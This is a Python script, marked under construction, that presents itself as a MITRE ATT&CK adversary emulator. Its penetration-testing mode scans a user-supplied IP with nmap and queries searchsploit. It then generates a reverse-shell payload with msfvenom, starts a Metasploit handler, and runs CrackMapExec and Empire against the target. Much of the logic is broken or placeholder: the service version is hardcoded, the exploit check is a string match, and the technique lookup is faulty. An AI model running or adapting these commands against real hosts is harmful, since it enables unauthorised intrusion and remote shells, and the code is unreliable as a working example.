######################################################################################################################################################################################################################
# ###Under Construction### Python adversary emulation simulator, in line with the MITRE ATT&CK Framerwork. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. 
# Performs simulations or real world attacks based on selections. Note: Real world penatration test attack selection will attempt to exploit discovered vulnerabilities based on logic. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import json
import requests
import time
import subprocess
import os

# Disclaimer
def display_disclaimer():
    disclaimer = """
    ***************************************
    DISCLAIMER:
    This script is intended for educational purposes only. Unauthorized access, use, or testing of systems without explicit consent is illegal and unethical.
    By running this script, you acknowledge and accept full responsibility for your actions. Only use this script on systems for which you have explicit permission.
    ***************************************
    """
    print(disclaimer)

# MITRE ATT&CK data URL (latest JSON dataset)
ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"

# Load the MITRE ATT&CK data (download it if necessary)
def download_attack_data():
    response = requests.get(ATTACK_DATA_URL)
    if response.status_code == 200:
        with open('attack_data.json', 'w') as f:
            f.write(response.text)
        print("[INFO] MITRE ATT&CK data downloaded successfully.")
    else:
        print("[ERROR] Failed to download MITRE ATT&CK data.")
        return None
    return 'attack_data.json'

# Load the APT group and technique data from the ATT&CK JSON file
def load_attack_data(filename='attack_data.json'):
    with open(filename, 'r') as f:
        data = json.load(f)
    return data

# Perform Nmap scan to identify services and versions on the target IP
def nmap_scan(target_ip):
    nmap_command = f"nmap -sV {target_ip}"
    result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True)
    return result.stdout

# Search Sploit for known vulnerabilities related to the service and version
def searchsploit_vulnerabilities(service_name, service_version):
    search_command = f"searchsploit {service_name} {service_version}"
    result = subprocess.run(search_command, shell=True, capture_output=True, text=True)
    return result.stdout

# Attempt to exploit a service using Metasploit
def attempt_exploit_with_metasploit(service_name, service_version, target_ip):
    print(f"[INFO] Attempting to exploit {service_name} {service_version} on {target_ip}...")

    search_command = f"searchsploit {service_name} {service_version}"
    result = subprocess.run(search_command, shell=True, capture_output=True, text=True)

    if "Apache" in result.stdout:  # Check if Apache exploit exists in SearchSploit output
        print(f"[INFO] Found exploit for {service_name} {service_version}!")
        
        # Metasploit: Generate the payload using msfvenom
        payload_command = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf -o /tmp/reverse_shell.elf"
        subprocess.run(payload_command, shell=True)

        # Metasploit: Use msfconsole to run the exploit
        metasploit_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit'"
        subprocess.run(metasploit_command, shell=True)
        
        print("[INFO] Exploit attempted, reverse shell initiated.")
    else:
        print(f"[INFO] No Metasploit exploit found for {service_name} {service_version}.")

# Run CrackMapExec for SMB enumeration and exploitation
def run_crackmapexec(target_ip):
    print(f"[INFO] Running CrackMapExec against {target_ip}...")
    # Example SMB enumeration
    crackmapexec_command = f"crackmapexec smb {target_ip} -u 'username' -p 'password'"
    subprocess.run(crackmapexec_command, shell=True)

# Run Empire post-exploitation framework
def run_empire_post_exploitation(target_ip):
    print(f"[INFO] Running Empire post-exploitation on {target_ip}...")
    empire_command = f"empire --agents {target_ip} --use_ssl"
    subprocess.run(empire_command, shell=True)

# Simulation of attack techniques based on MITRE ATT&CK framework
def simulate_technique(apt_group, technique):
    print(f"\n[INFO] Simulating {technique} for APT Group: {apt_group}...")
    time.sleep(2)  # Simulate execution time
    print(f"[INFO] Simulation for {technique} complete.\n")

# Main function for the simulation mode
def run_simulation():
    # Step 1: Check if ATT&CK data exists or download it
    if not os.path.exists('attack_data.json'):
        print("[INFO] ATT&CK data not found. Downloading...")
        download_attack_data()
    data = load_attack_data()  # Load the ATT&CK dataset

    # Step 2: Display available APT groups and let user select
    apt_groups = [group['name'] for group in data['objects'] if group['type'] == 'intrusion-set']
    print("Select an APT Group:")
    for i, group in enumerate(apt_groups, 1):
        print(f"{i}. {group}")

    apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
    selected_group = apt_groups[apt_group_selection - 1]
    print(f"[INFO] You selected: {selected_group}")

    # Step 3: Display techniques for the selected APT group
    techniques = [obj['name'] for obj in data['objects'] if obj['type'] == 'attack-pattern' and selected_group in [phase['phase_name'] for phase in obj.get('kill_chain_phases', [])]]
    
    print("\nSelect Techniques to simulate:")
    for i, technique in enumerate(techniques, 1):
        print(f"{i}. {technique}")
    
    selected_techniques = []
    while True:
        technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
        if technique_selection == 0:
            break
        selected_technique = techniques[technique_selection - 1]
        selected_techniques.append(selected_technique)
        simulate_technique(selected_group, selected_technique)

    # Report Generation
    report_format = input("Generate report in text or HTML format? (text/html): ").lower()
    if report_format == 'text':
        generate_text_report(selected_group, selected_techniques)
    elif report_format == 'html':
        generate_html_report(selected_group, selected_techniques)
    else:
        print("[ERROR] Invalid report format.")

# Generate text report
def generate_text_report(apt_group, techniques):
    with open(f"{apt_group}_report.txt", 'w') as report_file:
        report_file.write(f"APT Group: {apt_group}\n\n")
        for technique in techniques:
            report_file.write(f"- {technique}\n")
    print(f"[INFO] Report generated: {apt_group}_report.txt")

# Generate HTML report
def generate_html_report(apt_group, techniques):
    with open(f"{apt_group}_report.html", 'w') as report_file:
        report_file.write(f"<html><body><h1>APT Group: {apt_group}</h1><ul>\n")
        for technique in techniques:
            report_file.write(f"<li>{technique}</li>\n")
        report_file.write("</ul></body></html>")
    print(f"[INFO] Report generated: {apt_group}_report.html")

# Main function for penetration testing mode
def run_penetration_testing():
    target_ip = input("Enter the target IP address: ")

    # Perform Nmap scan to detect services and version
    nmap_results = nmap_scan(target_ip)
    print(f"[INFO] Nmap results:\n{nmap_results}")

    # Extracting a service and version from the Nmap scan
    service_name = "Apache"
    service_version = "2.4.7"  # This should be dynamically extracted from nmap_results

    # Cross-reference vulnerabilities using SearchSploit
    vulnerabilities = searchsploit_vulnerabilities(service_name, service_version)
    print(f"[INFO] SearchSploit results for {service_name} {service_version}:\n{vulnerabilities}")

    if vulnerabilities:
        print(f"[INFO] Found vulnerabilities. Attempting to exploit...")
        attempt_exploit_with_metasploit(service_name, service_version, target_ip)

    # Run CrackMapExec for SMB if detected
    if 'smb' in nmap_results.lower():
        run_crackmapexec(target_ip)

    # Run Empire for SSH-based post-exploitation
    if 'ssh' in nmap_results.lower():
        run_empire_post_exploitation(target_ip)

# Main entry point
def main():
    display_disclaimer()

    mode = input("Select mode: (1) Simulation (2) Penetration Testing: ")

    if mode == '1':
        run_simulation()
    elif mode == '2':
        run_penetration_testing()
    else:
        print("[ERROR] Invalid mode selected.")

if __name__ == "__main__":
    main()
